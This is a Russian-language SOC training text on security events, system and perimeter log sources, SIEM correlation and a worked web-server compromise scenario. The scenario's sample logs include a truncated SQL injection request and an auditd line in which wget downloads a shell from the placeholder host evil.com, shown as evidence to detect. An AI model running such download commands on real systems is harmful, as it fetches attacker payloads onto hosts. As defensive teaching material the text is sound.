# Наблюдаемая активность в системе и на периметре

## 1. Событие безопасности: от лога до инцидента
**Фундамент мониторинга** в SOC начинается с понятия *события безопасности* (security event). Согласно австралийскому центру кибербезопасности (ACSC), событие информационной безопасности — это наблюдаемое изменение состояния системы, службы или сети, которое может указывать на нарушение политики безопасности, отказ средств защиты или ранее неизвестную ситуацию, релевантную для безопасности [ACSC best practices](https://www.cyber.gov.au/sites/default/files/2024-08/best-practices-for-event-logging-and-threat-detection.pdf). Не каждое событие является инцидентом; это лишь атомарный факт, требующий анализа.

Иерархия понятий, с которой ежедневно работает аналитик уровня L1, выстраивается от самого детального артефакта до подтверждённого нарушения:

```text
[Лог (Log)] → {Сбор и нормализация} → [Событие (Event)] → {Корреляция и правила} → [Оповещение (Alert)] → {Триаж} → [Инцидент (Incident)]
```
- **Лог** — неструктурированная или полуструктурированная запись о работе компонента: файл журнала, запись в базе, syslog-сообщение.
- **Событие безопасности** — извлечённая из логов и контекстуализированная запись, признанная значимой для мониторинга (например, попытка входа под учётной записью с истёкшим сроком действия).
- **Оповещение (алерт)** — уведомление, сгенерированное средством мониторинга при совпадении события с правилом или порогом (5 неудачных логинов за минуту).
- **Инцидент** — подтверждённое вредоносное или нарушающее политику событие, оказывающее негативное воздействие (CSIRT-классификация: успешный brute force с захватом учётной записи).

Эта цепочка чётко разделяет сырые данные и аналитические артефакты, и ошибка на любом уровне (пропуск нормализации, некорректный порог алерта) ломает весь процесс обнаружения.

Сравнительная таблица иллюстрирует границы понятий:

| Понятие         | Ключевые признаки                                                                 | Пример (иллюстративная схема)                                     |
|-----------------|-----------------------------------------------------------------------------------|-------------------------------------------------------------------|
| Лог (Log)       | Сырая запись от источника, часто одна строка или структура, фиксирует факт        | `Jun 5 08:15:10 host sshd[1234]: Failed password for root from 10.2.3.4 port 22 ssh2` |
| Событие (Event) | Нормализованная запись с выделенными полями: тип, источник, результат, время      | `{ "event_type":"authentication_failure", "user":"root", "src_ip":"10.2.3.4", "timestamp":"2025-06-05T08:15:10Z" }` |
| Оповещение (Alert) | Сгенерировано системой при превышении порога или совпадении с правилом          | `Alert: Multiple SSH failures from 10.2.3.4 (>5 in 60s)`          |
| Инцидент (Incident) | Подтверждён аналитиком вредоносный факт, присвоен идентификатор тикета        | Incident #IR-2025-210: Unauthorized SSH access via brute force, root account compromised |

Источники событий разделяют на две большие категории, полностью покрывающие видимость SOC: **активность внутри систем** (логи операционных систем, приложений, баз данных, агентов конечных точек) и **активность на сетевом периметре** (межсетевые экраны, системы обнаружения вторжений, прокси, DNS, облачные логи потоков). Именно это деление определяет структуру дальнейшего изложения: наблюдаемая активность в системе (раздел 2) и на периметре (раздел 3).

## 2. Наблюдаемая активность в системе: источники, типы и форматы

Внутренняя активность охватывает любые действия на серверах, рабочих станциях и в прикладном ПО. Для аналитика L1 системные события — основной источник индикаторов компрометации уже проникшего злоумышленника. Всякое действие: аутентификация, запуск процесса, изменение конфигурации, обращение к реестру — оставляет след в журналах, и задача SOC — централизованно собрать эти следы.

### 2.1 Источники системных событий
К ключевым источникам, которые необходимо включить в мониторинг согласно CREST-гайду [Cyber Security Monitoring and Logging Guide](https://www.crest-approved.org/wp-content/uploads/2022/04/Cyber-Security-Monitoring-Guide.pdf), относятся:

- **Журналы операционных систем**: Windows Event Log (Security, System, Application, PowerShell Operational), Linux syslog/rsyslog (auth.log, syslog, kern.log), auditd.  
- **Журналы приложений**: веб-серверы (IIS, Apache, Nginx), базы данных (MS SQL, Oracle audit trail), почтовые серверы.  
- **Службы каталогов и аутентификации**: Active Directory (события контроллеров домена), Azure AD/Entra ID sign-in logs, RADIUS.  
- **Средства защиты конечных точек**: EDR/антивирусные агенты (логи обнаружения, блокировок), DLP-агенты.  
- **Системы конфигурации и оркестрации**: журналы выполнения скриптов, Ansible, SCCM.

### 2.2 Типы системных событий и их значение для безопасности
Любое системное событие можно классифицировать по источнику данных MITRE ATT&CK (Data Sources), что напрямую увязывает сырое событие с возможными техниками злоумышленника. Таблица ниже обобщает наиболее важные типы событий, фиксируемые в продуктивных SOC.

| Тип события (MITRE DS)          | Характерный источник и примеры кодов / полей (иллюстративно)                 | Индикатор угрозы (что ищет аналитик)                          |
|---------------------------------|------------------------------------------------------------------------------|---------------------------------------------------------------|
| **Аутентификация**              | Windows Security Event ID 4624/4625; Linux auth.log `sshd`; Azure Sign-in Log ResultType | Аномалии входа: нетипичное время, новый IP, обход MFA, подбор пароля |
| **Создание процесса**           | Windows Security 4688 (с командной строкой); Sysmon Event 1; Linux `execve` auditd | Подозрительные команды (powershell -enc, net user), дочерние процессы svchost→cmd |
| **Модификация реестра / конфигурации** | Windows Security 4657; Sysmon Event 12,13; Linux auditd изменения в /etc/passwd | Персистентность (Run-ключи), отключение UAC, добавление пользователей |
| **Работа с файлами**            | Windows Security 4663 (с детализацией доступа); Linux auditd open, unlink | Модификация конфиденциальных файлов, эксфильтрация, шифрование (ransomware) |
| **Службы и задания**            | Windows System Event 7045 (установка службы); Linux syslog `cron` запуск задач | Персистентность через службы, задания планировщика, вредоносные драйверы |
| **Использование PowerShell**    | Windows PowerShell Operational 4104 (script block logging), 4103 (module logging) | Обфусцированные скрипты, загрузка в память, обращение к подозрительным API |
| **Сетевые соединения на хосте** | Windows Security 5156 (фильтрация платформы); sysmon Event 3; Linux `connect` auditd | Подозрительные исходящие соединения на нестандартные порты, C2-каналы |
| **Ошибки приложений**           | Windows Application Event Log; Linux syslog daemon.err                     | Эксплуатация уязвимостей, отказы служб, аномальная деградация |

Каждое из этих событий редко говорит об инциденте само по себе — только корреляция (раздел 4) и сопоставление с периметровыми данными выявляют полную картину атаки.

### 2.3 Форматы и сбор
Системные события поступают в различных форматах: Windows Event Log часто передаётся в SIEM через agent (Winlogbeat) в XML или в собственном формате, syslog — как текстовые сообщения по RFC 5424, auditd — как структурированные записи. Нормализация (раздел 4) приводит всё к единой модели. Практика рекомендует централизованное хранение с ротацией и обеспечением целостности (hash chain) [CREST](https://www.crest-approved.org/wp-content/uploads/2022/04/Cyber-Security-Monitoring-Guide.pdf).

## 3. Наблюдаемая активность на периметре: сетевые события и границы

Периметр организации — совокупность точек взаимодействия с внешними сетями: межсетевые экраны, маршрутизаторы, облачные сервисы, VPN-шлюзы. События периметра отражают попытки проникновения, сканирования, C2-коммуникации и эксфильтрацию данных на ранних этапах, ещё до попадания внутрь системы.

### 3.1 Источники периметровых событий
В соответствии с рекомендациями CREST и практикой SOC мониторинг периметра должен охватывать следующие категории [Cyber Security Monitoring and Logging Guide](https://www.crest-approved.org/wp-content/uploads/2022/04/Cyber-Security-Monitoring-Guide.pdf):

- **Межсетевые экраны (firewall)**: логи разрешённых и запрещённых соединений (Cisco ASA, Palo Alto, iptables, cloud NSG).  
- **Системы обнаружения/предотвращения вторжений (IDS/IPS)**: алерты на сигнатуры атак (Snort, Suricata, Cisco Firepower).  
- **Прокси-серверы**: журналы доступа к URL, категории контента, объём данных (Squid, Blue Coat, Zscaler).  
- **DNS-серверы**: запросы доменных имён, разрешённые IP (BIND, Microsoft DNS, Infoblox).  
- **Веб-серверы периметра**: логи доступа, ошибок, заголовки запросов (Apache access.log, IIS W3C).  
- **Потоковые данные**: NetFlow/IPFIX/sFlow — агрегированная информация о трафике.  
- **Облачные источники**: VPC Flow Logs (AWS), NSG Flow Logs (Azure), GCP Firewall Rules Logging, CloudTrail (события управления), Cloud IDS.

### 3.2 Типы периметровых событий и индикаторы угроз
Периметровое событие содержит минимум пяти элементов: временную метку, IP-адреса источника и назначения, порты, протокол, действие (разрешено/заблокировано) и часто расширенные поля — URL, сигнатура атаки, домен.

| Тип события                  | Источник / Формат (пример)                                | Ключевые поля                                                                 | Индикатор злонамеренной активности                         |
|------------------------------|-----------------------------------------------------------|-------------------------------------------------------------------------------|------------------------------------------------------------|
| **Блокировка соединения**    | Firewall deny log (syslog CEF)                            | src, dst, s_port, d_port, protocol, action=deny                              | Повторяющиеся блокировки на чувствительные порты (сканирование) |
| **Срабатывание сигнатуры IDS** | Snort оповещение (`snort.alert.fast`)                    | signature_id, signature, src, dst, classification                               | Эксплуатация уязвимости, известные вредоносные шаблоны    |
| **Аномальный DNS-запрос**    | DNS query log (Microsoft DNS Operational, BIND querylog) | qname, qtype, client_ip, ответ (NXDOMAIN)                                       | DGA-домены, туннелирование через DNS, запросы к newly seen domains |
| **Подозрительный HTTP(S) запрос** | Прокси/веб-сервер access log                         | url, user_agent, http_status, content_type, bytes_out                         | SQLi/XSS в параметрах, user-agent ботов, обращение к C2 через HTTPS |
| **Сканирование портов**      | NetFlow/IPFIX (nfdump) или firewall                      | source IP, большое количество dst_port за короткий интервал                    | Разведка перед атакой                                      |
| **Исходящий трафик к известным вредоносным IP** | Firewall + Threat Intelligence фид               | dst_ip сопоставляется с IoC-списком                                           | C2-канал или эксфильтрация                                 |
| **Отказ в обслуживании (DoS)** | Netflow/IPS аномалии; firewall пороговые значения        | Количество пакетов/соединений превышает baseline                               | SYN flood, UDP amplification                              |

### 3.3 Нормализация периметровых событий
Периметровые устройства часто поставляют события в разных форматах: Syslog (RFC 3164/5424), NetFlow v9/IPFIX, JSON (облачные платформы), W3C для IIS. SIEM-платформы осуществляют парсинг и приведение к общей схеме (Common Event Format, CEF или Elastic Common Schema), чтобы корреляция с системными событиями стала возможной. К примеру, стандартный CEF-заголовок для события IDS выглядит как:

```cef
CEF:0|Vendor|Product|Version|Signature ID|Name|Severity|...
```

Подобная унификация — обязательный шаг, без которого корреляция между «попыткой эксплуатации IIS» (периметр) и «запуском cmd.exe от w3wp.exe» (система) невозможна.

## 4. Применение: сбор, корреляция и анализ событий безопасности

Наблюдаемая активность, как в системе, так и на периметре, превращается в разведывательный контекст только после централизованного сбора, нормализации и корреляции. SIEM (Security Information and Event Management) — ядро этого процесса — объединяет все потоки событий, выполняет парсинг, обогащение данными Threat Intelligence и выдаёт оповещения для аналитиков L1.

### 4.1 Этапы обработки событий в конвейере SOC
1. **Сбор (Ingestion):** агенты (например, Winlogbeat, Filebeat) или сетевые коллекторы (syslog-серверы) принимают логи и передают в SIEM. Безагентные сценарии — Windows Event Forwarding, rsyslog.
2. **Нормализация:** парсер разбивает сырой лог на поля (время, источник, событие, результат) и обогащает их. Например, Windows Event ID 4625 превращается в запись с полями `event.outcome=failure`, `event.action=authentication`, `user.target.name`.
3. **Фильтрация и маршрутизация:** отбрасывание заведомо ложных срабатываний (например, внутренние служебные учетные записи) и направление событий в соответствующие индексы/хранилища.
4. **Корреляция:** применение правил, объединяющих события из разных источников для выявления атак. Классический пример — Brute Force: правило учитывает подсчёт Event ID 4625 с одного IP за короткий интервал, а затем если следует успешный вход (4624) — создаёт инцидент.
5. **Генерация оповещения и триаж:** SIEM выводит алерт на консоль SOC; аналитик L1 проверяет контекст, сопоставляет с Threat Intelligence и принимает решение об эскалации.

### 4.2 Пример правила корреляции: атака перебором на SSH
Рассмотрим сквозной случай: периметр фиксирует множество разрешённых SSH-соединений на порт 22 из одного внешнего IP, а системный журнал — серию неудачных аутентификаций. Ниже приведён иллюстративный поисковый запрос на языке Splunk, который мог бы детектировать атаку на основе системных событий (auth.log Linux, собранный в SIEM):

```spl
index=linux_syslog sourcetype=linux_secure "Failed password"
| bin _time span=1m
| stats count by src_ip, user, _time
| where count > 5
| join type=inner src_ip [ search index=linux_syslog sourcetype=linux_secure "Accepted password" | eval success_time=_time | table src_ip, success_time ]
| eval alert="Potential SSH brute force: >5 failures followed by success"
| table _time, src_ip, user, count, success_time, alert
```

Пояснение работы: сначала считаются неудачные попытки за 1-минутные интервалы, затем найденные IP проверяются на наличие успешного входа. Если условие выполнено — создаётся алерт. В реальном SIEM (Splunk, Elastic) правило может быть реализовано через корреляционное правило или сигму.

### 4.3 Инструментарий и роль аналитика L1
Основные SIEM-платформы (Splunk ES, Elastic Security, Microsoft Sentinel, QRadar) предоставляют встроенные правила, но SOC всегда дополняет их специфическими правилами под свою инфраструктуру. Аналитик первого уровня (L1) отвечает за:
- Мониторинг очереди оповещений в реальном времени.
- Первичный разбор: проверка легитимности IP, пользователей, типов событий.
- Эскалацию при подтверждении подозрительной активности на L2.
- Внесение false positive обратно в правила для подавления.

Использование событий как с внутренних систем, так и с периметра — единственный способ обеспечить покрытие Kill Chain от разведки до действий на цели.

## 5. Сквозной практический пример: от периметрового события к системной компрометации

Сценарий: внешний злоумышленник проводит разведку веб-сервера, затем эксплуатирует уязвимость веб-приложения, получает шелл и повышает привилегии. SOC L1 должен зафиксировать атаку, используя события обоих типов.

**Исходные условия:**  
- ОС: Ubuntu 22.04, веб-сервер Apache, SIEM Splunk, источник логов: /var/log/syslog, /var/log/auth.log, межсетевой экран iptables с логированием сбросов, IDS Snort на границе периметра.  
- Аналитик использует консоль Splunk для расследования.

### Шаг 1. Периметровое оповещение IDS
На границе Snort детектирует сигнатуру веб-сканирования (`WEB-MISC Nikto scan`) и генерирует alert. В Splunk поступает запись:

```snort
[**] [1:1000001:1] WEB-MISC Nikto scan [**]
[Classification: Web Application Attack] [Priority: 2]
06/05-10:12:34.567890 192.0.2.88:55123 -> 203.0.113.10:80
TCP TTL:64 TOS:0x0 ID:12345 IpLen:20 DgmLen:1500
***AP*** Seq: 0x1A2B3C4D  Ack: 0x5E6F7G8H  Win: 0xFFFF  TcpLen: 32
```

Аналитик замечает множество однотипных оповещений от одного источника `192.0.2.88` на порт 80.

### Шаг 2. Корреляция с логами веб-сервера на периметре
Параллельно SIEM собирает access.log веб-сервера. Аналитик фильтрует запросы с того же IP:

```bash
grep "192.0.2.88" /var/log/apache2/access.log
```
Пример вывода (иллюстративно):
```
192.0.2.88 - - [05/Jun/2025:10:12:33 +0000] "GET /index.php?id=1' UNION SELECT..." 200 512
192.0.2.88 - - [05/Jun/2025:10:12:35 +0000] "GET /admin/login HTTP/1.1" 401 1234
```
Обнаружена SQL-инъекция.

### Шаг 3. Системное событие: выполнение подозрительной команды
Вскоре после инъекции в журналах системы появляются аномальные события. SIEM фиксирует syslog-событие от Auditd (type=EXECVE):

```syslog
Jun  5 10:13:01 webserver auditd[1234]: type=EXECVE msg=audit(1717575981.123:456): argc=3 a0="/bin/sh" a1="-c" a2="wget http://evil.com/shell -O /tmp/shell"
```

Одновременно из auth.log поступают записи о неудачной попытке sudo:

```syslog
Jun  5 10:14:00 webserver sudo:   www-data : user NOT in sudoers ; TTY=pts/0 ; PWD=/var/www/html ; USER=root ; COMMAND=/usr/bin/id
```

### Шаг 4. Алерт SIEM: правило на цепочку событий
Корреляционное правило Splunk объединяет последовательность: IDS alert + SQLi в access.log + необычный дочерний процесс (wget) + попытка sudo. Генерируется оповещение в JSON-подобном формате:

```json
{
  "rule_name": "WebServer_Compromise_Chain",
  "severity": "Critical",
  "timestamp": "2025-06-05T10:14:05Z",
  "entities": {
    "src_ip": "192.0.2.88",
    "dest_host": "webserver",
    "user": "www-data",
    "process": "/tmp/shell",
    "attack_phase": "Exploitation & Privilege Escalation"
  },
  "trigger_events": [
    "ids_alert_nikto",
    "apache_sqli_attempt",
    "auditd_execve_suspicious",
    "sudo_attempt_failed"
  ]
}
```

### Шаг 5. Верификация аналитиком L1
Аналитик проверяет наличие вредоносного процесса на сервере с помощью удалённой команды:

```bash
ps aux | grep shell
```
Вывод показывает:
```
www-data  1234  0.0  0.1  12345  5678 ?        S    10:13   0:00 /bin/sh -c /tmp/shell
```

Убедившись в компрометации, аналитик создаёт инцидент с детальным хронометражом атаки, приложив все артефакты, и эскалирует на L2 для изоляции хоста и форензики.

**Ожидаемый вывод:** Пример демонстрирует, как наблюдаемая активность на периметре (IDS, веб-лог) и внутри системы (auditd, auth.log) объединяется в целостную картину атаки, давая аналитику достаточно данных для перехода от оповещения к инциденту.
